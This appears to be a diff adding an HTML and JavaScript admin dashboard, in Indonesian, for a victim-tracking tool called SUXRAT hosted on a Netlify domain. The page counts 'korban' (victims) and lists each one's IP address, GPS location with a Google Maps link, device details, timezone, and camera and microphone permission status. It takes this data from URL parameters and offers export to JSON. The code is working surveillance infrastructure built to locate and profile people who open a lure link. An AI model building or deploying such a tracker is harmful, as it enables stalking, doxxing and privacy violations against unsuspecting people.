@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SUXRAT ADMIN PANEL</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
+        body{
+            background:#0a0a0a;
+            min-height:100vh;
+            padding:20px;
+            color:#00aaff
+        }
+        .container{
+            max-width:1200px;
+            margin:0 auto;
+            background:#1a1a1a;
+            border:3px solid #00aaff;
+            border-radius:40px;
+            padding:30px
+        }
+        h1{
+            text-align:center;
+            color:#00aaff;
+            font-size:3rem;
+            margin-bottom:10px
+        }
+        .sub{
+            text-align:center;
+            color:#aaa;
+            margin-bottom:30px
+        }
+        .stats{
+            display:grid;
+            grid-template-columns:repeat(4,1fr);
+            gap:15px;
+            margin:30px 0
+        }
+        .stat-box{
+            background:#111;
+            border:2px solid #00aaff;
+            border-radius:20px;
+            padding:20px;
+            text-align:center
+        }
+        .stat-number{
+            font-size:2.5rem;
+            color:#00aaff;
+            font-weight:bold
+        }
+        .stat-label{
+            color:#aaa
+        }
+        .log-panel{
+            background:#000;
+            border:2px solid #00aaff;
+            border-radius:30px;
+            padding:20px;
+            height:500px;
+            overflow-y:auto;
+            margin:20px 0
+        }
+        .log-entry{
+            border-left:4px solid #00aaff;
+            padding:15px;
+            margin:15px 0;
+            background:#111;
+            border-radius:10px
+        }
+        .timestamp{
+            color:#00aaff;
+            font-size:0.8rem;
+            margin-bottom:10px
+        }
+        .data-row{
+            display:flex;
+            margin:8px 0;
+            gap:10px
+        }
+        .label{
+            color:#ffaa00;
+            min-width:120px
+        }
+        .value{
+            color:#fff
+        }
+        .button-group{
+            display:flex;
+            gap:10px;
+            margin:20px 0;
+            flex-wrap:wrap
+        }
+        button{
+            background:#00aaff;
+            color:#000;
+            border:none;
+            padding:12px 25px;
+            border-radius:30px;
+            font-weight:bold;
+            cursor:pointer
+        }
+        button:hover{opacity:0.8}
+        button.danger{background:#ff5555;color:#fff}
+        .maps-link{color:#00aaff}
+        .raw-data{
+            background:#000;
+            padding:8px;
+            border-radius:5px;
+            font-size:0.8rem;
+            color:#888;
+            margin-top:10px
+        }
+        #trackerUrl{
+            color:#00aaff;
+            font-weight:bold
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📡 SUXRAT TRACKER ADMIN</h1>
+        <div class="sub">Live Data - Domain: suxrat.netlify.app</div>
+        
+        <div class="stats" id="stats">
+            <div class="stat-box">
+                <div class="stat-number" id="totalIP">0</div>
+                <div class="stat-label">Total Korban</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number" id="totalLokasi">0</div>
+                <div class="stat-label">Dengan Lokasi</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number" id="totalCamera">0</div>
+                <div class="stat-label">Izin Kamera</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number" id="totalMic">0</div>
+                <div class="stat-label">Izin Mic</div>
+            </div>
+        </div>
+        
+        <div class="button-group">
+            <button onclick="refreshData()">🔄 REFRESH</button>
+            <button onclick="exportData()">📥 EXPORT JSON</button>
+            <button class="danger" onclick="clearData()">🗑️ CLEAR ALL</button>
+        </div>
+        
+        <div class="log-panel" id="logPanel">
+            <div class="log-entry">
+                <div class="timestamp">[SYSTEM]</div>
+                <div class="data-row"><span class="label">Status:</span><span class="value">Menunggu data korban...</span></div>
+                <div class="data-row"><span class="label">Tracker URL:</span><span class="value" id="trackerUrl">https://suxrat.netlify.app/</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let dataKorban = JSON.parse(localStorage.getItem('suxratData')) || [];
+        
+        function updateStats() {
+            document.getElementById('totalIP').innerText = dataKorban.length;
+            document.getElementById('totalLokasi').innerText = dataKorban.filter(d => d.lokasi && d.lokasi.lat).length;
+            document.getElementById('totalCamera').innerText = dataKorban.filter(d => d.camera).length;
+            document.getElementById('totalMic').innerText = dataKorban.filter(d => d.mic).length;
+        }
+        
+        function renderData() {
+            let panel = document.getElementById('logPanel');
+            
+            if(dataKorban.length === 0) {
+                panel.innerHTML = `
+                    <div class="log-entry">
+                        <div class="timestamp">[SYSTEM]</div>
+                        <div class="data-row"><span class="label">Status:</span><span class="value">Belum ada data korban</span></div>
+                        <div class="data-row"><span class="label">Tracker URL:</span><span class="value">https://suxrat.netlify.app/</span></div>
+                    </div>
+                `;
+                return;
+            }
+            
+            let html = '';
+            dataKorban.slice().reverse().forEach(d => {
+                html += `<div class="log-entry">`;
+                html += `<div class="timestamp">📅 ${d.timestamp || '-'}</div>`;
+                html += `<div class="data-row"><span class="label">🌐 IP:</span><span class="value">${d.ip || '-'}</span></div>`;
+                
+                if(d.lokasi && d.lokasi.lat) {
+                    html += `<div class="data-row"><span class="label">📍 Lokasi:</span><span class="value">${d.lokasi.lat}, ${d.lokasi.lng}</span></div>`;
+                    html += `<div class="data-row"><span class="label">🗺️ Maps:</span><span class="value"><a href="https://www.google.com/maps?q=${d.lokasi.lat},${d.lokasi.lng}" target="_blank" class="maps-link">Lihat Maps</a></span></div>`;
+                }
+                
+                if(d.device) {
+                    html += `<div class="data-row"><span class="label">💻 Device:</span><span class="value">${d.device.platform || '-'}</span></div>`;
+                    html += `<div class="data-row"><span class="label">📱 Layar:</span><span class="value">${d.device.screen || '-'}</span></div>`;
+                    html += `<div class="data-row"><span class="label">⏰ Timezone:</span><span class="value">${d.device.timezone || '-'}</span></div>`;
+                }
+                
+                html += `<div class="data-row"><span class="label">📷 Kamera:</span><span class="value">${d.camera ? '✅' : '❌'}</span></div>`;
+                html += `<div class="data-row"><span class="label">🎤 Mikrofon:</span><span class="value">${d.mic ? '✅' : '❌'}</span></div>`;
+                html += `<div class="raw-data">📦 ${JSON.stringify(d).substring(0,150)}...</div>`;
+                html += `</div>`;
+            });
+            
+            panel.innerHTML = html;
+            updateStats();
+        }
+        
+        function getDataFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const dataParam = params.get('data');
+            
+            if(dataParam) {
+                try {
+                    let newData = JSON.parse(decodeURIComponent(dataParam));
+                    dataKorban.push(newData);
+                    localStorage.setItem('suxratData', JSON.stringify(dataKorban));
+                    window.history.replaceState({}, '', window.location.pathname);
+                } catch(e) {}
+            }
+        }
+        
+        function refreshData() {
+            getDataFromURL();
+            renderData();
+        }
+        
+        function clearData() {
+            if(confirm('Hapus semua data?')) {
+                dataKorban = [];
+                localStorage.removeItem('suxratData');
+                renderData();
+            }
+        }
+        
+        function exportData() {
+            let blob = new Blob([JSON.stringify(dataKorban, null, 2)], {type: 'application/json'});
+            let url = URL.createObjectURL(blob);
+            let a = document.createElement('a');
+            a.href = url;
+            a.download = `suxrat_data_${new Date().toISOString().split('T')[0]}.json`;
+            a.click();
+        }
+        
+        refreshData();
+        setInterval(refreshData, 3000);
+    </script>
+</body>
+  </html>
